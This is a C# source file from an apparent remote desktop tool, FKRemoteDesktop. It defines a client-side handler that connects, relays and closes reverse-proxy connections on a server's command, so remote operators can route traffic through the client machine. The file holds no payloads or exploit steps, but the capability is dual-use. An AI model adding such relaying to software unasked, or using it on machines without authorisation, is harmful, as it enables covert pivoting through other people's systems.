using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.ReverseProxy;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class ReverseProxyHandler : IMessageProcessor
    {
        private readonly FKClient _client;

        public ReverseProxyHandler(FKClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ReverseProxyConnect ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnect msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: ReverseProxyConnect");
                    Execute(sender, msg);
                    break;

                case ReverseProxyData msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: ReverseProxyData");
                    Execute(sender, msg);
                    break;

                case ReverseProxyDisconnect msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: ReverseProxyDisconnect");
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, ReverseProxyConnect message)
        {
            _client.ConnectReverseProxy(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);
            proxyClient?.SendToTargetServer(message.Data);
        }

        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);
            socksClient?.Disconnect();
        }
    }
}